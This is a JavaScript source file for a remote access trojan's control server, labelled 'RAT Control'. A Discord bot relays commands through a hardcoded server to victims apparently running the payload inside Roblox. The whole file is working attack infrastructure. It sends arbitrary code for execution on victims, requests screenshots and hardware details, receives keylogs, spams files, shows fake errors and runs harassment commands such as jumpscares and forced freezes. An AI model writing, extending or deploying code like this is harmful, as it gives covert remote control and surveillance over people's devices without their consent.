const http = require('http');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const PORT = process.env.PORT || 10000;

let commandQueue = [];
let lastScreenshot = null;
global.onlineUsers = new Map();

let discordClient = null;

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ] 
    });

    async function sendCommand(command, args = [], target = null) {
        try {
            const payload = { command, args };
            if (target) payload.target = target;
            
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            return response.ok;
        } catch (error) {
            return false;
        }
    }

    async function getOnlineUsers() {
        try {
            const response = await fetch(`${SERVER_URL}/users`);
            if (response.ok) return await response.json();
            return { users: [], count: 0 };
        } catch (error) {
            return { users: [], count: 0 };
        }
    }

    function parseCommandWithTarget(message) {
        const args = message.content.slice(1).split(' ');
        const command = args.shift().toLowerCase();
        
        const noTargetCommands = ['users', 'status', 'help', 'test', 'print', 'antileave'];
        
        if (noTargetCommands.includes(command) || args.length === 0) {
            return { command, args, target: null };
        }
        
        if (command === 'antileave') {
            if (args[0] === 'status') return { command, args, target: null };
            if (args[0] === 'enable' && args.length > 1 && !args[1].match(/^[0-9]+$/)) {
                const target = args[1];
                args.splice(1, 1);
                return { command, args, target };
            }
        }
        
        const firstArg = args[0];
        const isNumber = !isNaN(parseInt(firstArg));
        const isSpecialArg = firstArg.match(/^[0-9]+$/) || firstArg.startsWith('-');
        
        if (!isNumber && !isSpecialArg) {
            const target = args.shift();
            return { command, args, target };
        }
        
        return { command, args, target: null };
    }

    function createEmbed(title, description, color, target = null) {
        const embed = new EmbedBuilder().setTitle(title).setColor(color);
        if (target) embed.setDescription(`**🎯 Цель:** \`${target}\`\n${description}`);
        else embed.setDescription(description);
        return embed;
    }

    discordClient.on('ready', () => {
        console.log(`Bot ${discordClient.user.tag} ready`);
        discordClient.user.setActivity('RAT Control', { type: 'WATCHING' });
    });

    discordClient.on('messageCreate', async message => {
        if (message.author.bot) return;
        
        if (message.content.startsWith('/')) {
            const { command, args, target } = parseCommandWithTarget(message);
            
            const commandHandlers = {
                test: async () => {
                    if (await sendCommand("popup", ["Test from Discord"], target)) {
                        await message.reply({ embeds: [createEmbed('Test', 'Message sent', 0x00ff00, target)] });
                    }
                },
                
                print: async () => {
                    if (await sendCommand("print", [], target)) {
                        await message.reply({ embeds: [createEmbed('Ping', 'Command sent', 0x00ff00, target)] });
                    }
                },
                
                kick: async () => {
                    const reason = args.join(' ') || 'Kicked by admin';
                    if (await sendCommand("kick", [reason], target)) {
                        await message.reply({ embeds: [createEmbed('Kick', `Reason: ${reason}`, 0xe74c3c, target)] });
                    }
                },
                
                freeze: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 60);
                    if (await sendCommand("freeze", [seconds], target)) {
                        await message.reply({ embeds: [createEmbed('Freeze', `Duration: ${seconds}s`, 0x3498db, target)] });
                    }
                },
                
                void: async () => {
                    if (await sendCommand("void", [], target)) {
                        await message.reply({ embeds: [createEmbed('Void', 'Player sent to void', 0x2c3e50, target)] });
                    }
                },
                
                spin: async () => {
                    if (await sendCommand("spin", [], target)) {
                        await message.reply({ embeds: [createEmbed('Spin', 'Player spinning', 0xf39c12, target)] });
                    }
                },
                
                fling: async () => {
                    if (await sendCommand("fling", [], target)) {
                        await message.reply({ embeds: [createEmbed('Fling', 'Player flung', 0xe67e22, target)] });
                    }
                },
                
                blur: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 30);
                    if (await sendCommand("blur", [seconds], target)) {
                        await message.reply({ embeds: [createEmbed('Blur', `Duration: ${seconds}s`, 0x3498db, target)] });
                    }
                },
                
                chat: async () => {
                    if (await sendCommand("chat", [], target)) {
                        await message.reply({ embeds: [createEmbed('Chat', 'Chat toggled', 0x9b59b6, target)] });
                    }
                },
                
                message: async () => {
                    const text = args.join(' ');
                    if (!text) {
                        await message.reply('Specify message text');
                        return;
                    }
                    if (text.length > 100) {
                        await message.reply('Message too long (max 100 chars)');
                        return;
                    }
                    if (await sendCommand("popup", [text], target)) {
                        await message.reply({ embeds: [createEmbed('Message', `Text: ${text.substring(0, 50)}...`, 0x3498db, target)] });
                    }
                },
                
                jumpscare: async () => {
                    let scareType = parseInt(args[0]) || 1;
                    if (await sendCommand("jumpscare", [scareType], target)) {
                        await message.reply({ embeds: [createEmbed('Jumpscare', `Type: ${scareType}`, 0xff0000, target)] });
                    }
                },
                
                execute: async () => {
                    const code = args.join(' ');
                    if (!code) {
                        await message.reply('Specify code to execute');
                        return;
                    }
                    if (await sendCommand("execute", [code], target)) {
                        await message.reply({ embeds: [createEmbed('Execute', 'Code sent', 0xf39c12, target)] });
                    }
                },
                
                fakeerror: async () => {
                    const errorText = args.join(' ') || 'System Error';
                    if (await sendCommand("fakeerror", [errorText], target)) {
                        await message.reply({ embeds: [createEmbed('Fake Error', `Text: ${errorText.substring(0, 50)}...`, 0xe74c3c, target)] });
                    }
                },
                
                hardware: async () => {
                    if (await sendCommand("hardware", [], target)) {
                        await message.reply({ embeds: [createEmbed('Hardware', 'Info requested', 0x00ff00, target)] });
                    }
                },
                
                memory: async () => {
                    let fileCount = parseInt(args[0]) || 100;
                    fileCount = Math.min(fileCount, 1000);
                    if (await sendCommand("memory_spam", [fileCount], target)) {
                        await message.reply({ embeds: [createEmbed('Memory Spam', `Files: ${fileCount}`, 0xff6b6b, target)] });
                    }
                },
                
                screenshot: async () => {
                    if (await sendCommand("screenshot", [], target)) {
                        await message.reply({ embeds: [createEmbed('Screenshot', 'Requested', 0x3498db, target)] });
                    }
                },
                
                antileave: async () => {
                    const action = args[0]?.toLowerCase();
                    
                    if (!action || !['enable', 'disable', 'status'].includes(action)) {
                        const embed = new EmbedBuilder()
                            .setTitle('🛡️ AntiLeave System')
                            .setDescription('**Usage:**')
                            .setColor(0x7289da)
                            .addFields(
                                { name: 'Enable for all', value: '`/antileave enable`', inline: true },
                                { name: 'Enable for player', value: '`/antileave enable name`', inline: true },
                                { name: 'Disable', value: '`/antileave disable`', inline: true },
                                { name: 'Status', value: '`/antileave status`', inline: true }
                            );
                        await message.reply({ embeds: [embed] });
                        return;
                    }
                    
                    let targetForCommand = null;
                    let argsForCommand = [action];
                    
                    if (action === 'enable') {
                        if (target) {
                            targetForCommand = target;
                            argsForCommand.push(target);
                        } else if (args[1] && !args[1].match(/^[0-9]+$/)) {
                            targetForCommand = args[1];
                            argsForCommand.push(args[1]);
                        }
                    }
                    
                    if (await sendCommand("anti_leave", argsForCommand, targetForCommand || null)) {
                        let description = '';
                        let embedColor = 0x3498db;
                        
                        if (action === 'enable') {
                            description = '**AntiLeave Activated!**';
                            if (targetForCommand) description += `\n**Target:** \`${targetForCommand}\``;
                            embedColor = 0xff0000;
                        } else if (action === 'disable') {
                            description = '**AntiLeave Deactivated**';
                            embedColor = 0x00ff00;
                        } else {
                            description = '**Status request sent**';
                        }
                        
                        const embed = createEmbed(
                            action === 'enable' ? 'AntiLeave Enabled' : 
                            action === 'disable' ? 'AntiLeave Disabled' : 'AntiLeave Status',
                            description,
                            embedColor,
                            targetForCommand || null
                        );
                        
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                users: async () => {
                    const data = await getOnlineUsers();
                    
                    if (data.count === 0) {
                        await message.reply('No online users');
                        return;
                    }
                    
                    const embed = new EmbedBuilder()
                        .setTitle('Online Users')
                        .setDescription(`**Total:** ${data.count}`)
                        .setColor(0x00ff00);
                    
                    data.users.forEach(user => {
                        embed.addFields({
                            name: user.player,
                            value: `Game: ${user.place || 'Unknown'}\nDevice: ${user.device || 'Unknown'}`,
                            inline: true
                        });
                    });
                    
                    await message.reply({ embeds: [embed] });
                },
                
                status: async () => {
                    try {
                        const response = await fetch(`${SERVER_URL}/status`);
                        if (response.ok) {
                            const data = await response.json();
                            const embed = new EmbedBuilder()
                                .setTitle('System Status')
                                .setColor(0x7289da)
                                .addFields(
                                    { name: 'Online Users', value: `${data.online_users || 0}`, inline: true },
                                    { name: 'Pending Commands', value: `${data.pending_commands || 0}`, inline: true },
                                    { name: 'Server', value: '🟢 Online', inline: true }
                                );
                            await message.reply({ embeds: [embed] });
                        }
                    } catch (e) {
                        await message.reply('Error getting status');
                    }
                },
                
                help: async () => {
                    const helpEmbed = new EmbedBuilder()
                        .setTitle('RAT Control Panel')
                        .setDescription('**Available Commands:**')
                        .setColor(0x7289da)
                        .addFields(
                            { name: '🛡️ AntiLeave', value: '`/antileave enable [name]`\n`/antileave disable`\n`/antileave status`', inline: false },
                            { name: '👤 Player Control', value: '`/kick [name] <reason>`\n`/freeze [name] <seconds>`\n`/void [name]`\n`/spin [name]`\n`/fling [name]`', inline: false },
                            { name: '⚙️ System', value: '`/execute [name] <code>`\n`/fakeerror [name] <text>`\n`/hardware [name]`\n`/screenshot [name]`', inline: false },
                            { name: '👻 Fun', value: '`/jumpscare [name] <type>`\n`/blur [name] <seconds>`\n`/message [name] <text>`', inline: false },
                            { name: '📊 Info', value: '`/users`\n`/status`\n`/test`\n`/print`', inline: false }
                        );
                    
                    await message.reply({ embeds: [helpEmbed] });
                }
            };
            
            if (commandHandlers[command]) {
                try {
                    await commandHandlers[command]();
                } catch (error) {
                    await message.reply('Error executing command');
                }
            } else if (command) {
                await message.reply(`Unknown command \`${command}\`. Use \`/help\` for list.`);
            }
        }
    });

    discordClient.login(DISCORD_TOKEN).catch(() => {});
}

function cleanupInactiveUsers() {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 60 * 1000) {
            global.onlineUsers.delete(key);
        }
    }
}

setInterval(cleanupInactiveUsers, 30 * 1000);

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    if (req.method === 'GET' && req.url.startsWith('/data')) {
        try {
            const url = new URL(req.url, `http://${req.headers.host}`);
            const player = url.searchParams.get('player');
            
            const commandsForPlayer = [];
            const remainingCommands = [];
            
            for (const cmd of commandQueue) {
                if (cmd.target === null || cmd.target === player || cmd.target === 'all') {
                    commandsForPlayer.push(cmd);
                } else {
                    remainingCommands.push(cmd);
                }
            }
            
            commandQueue = remainingCommands;
            
            if (commandsForPlayer.length > 0) {
                const cmd = commandsForPlayer[0];
                res.end(JSON.stringify({
                    command: cmd.command,
                    args: cmd.args
                }));
            } else {
                res.end(JSON.stringify({
                    command: "",
                    args: []
                }));
            }
        } catch (e) {
            res.statusCode = 400;
            res.end(JSON.stringify({ error: e.message }));
        }
        return;
    }
    
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { command, args, target } = JSON.parse(body);
                commandQueue.push({ command, args: args || [], target: target || null });
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    if (req.method === 'GET' && req.url === '/users') {
        cleanupInactiveUsers();
        const users = Array.from(global.onlineUsers.values());
        res.end(JSON.stringify({ users: users, count: users.length }));
        return;
    }
    
    if (req.method === 'POST' && req.url === '/users') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { player, place, executor, device } = JSON.parse(body);
                global.onlineUsers.set(player, {
                    player: player,
                    place: place,
                    executor: executor,
                    device: device || "Unknown",
                    lastSeen: Date.now()
                });
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    if (req.method === 'GET' && req.url === '/screenshot') {
        res.end(JSON.stringify({ image: lastScreenshot || null }));
        return;
    }
    
    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            res.end(JSON.stringify({ status: "OK" }));
        });
        return;
    }
    
    if (req.method === 'POST' && req.url === '/hardware') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            res.end(JSON.stringify({ status: "OK" }));
        });
        return;
    }
    
    if (req.method === 'GET' && req.url === '/status') {
        cleanupInactiveUsers();
        res.end(JSON.stringify({
            status: "online",
            online_users: global.onlineUsers.size,
            pending_commands: commandQueue.length
        }));
        return;
    }
    
    if (req.method === 'GET' && req.url === '/') {
        res.end(JSON.stringify({
            message: "RAT Control System",
            endpoints: ["/data", "/command", "/users", "/status", "/screenshot"]
        }));
        return;
    }
    
    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
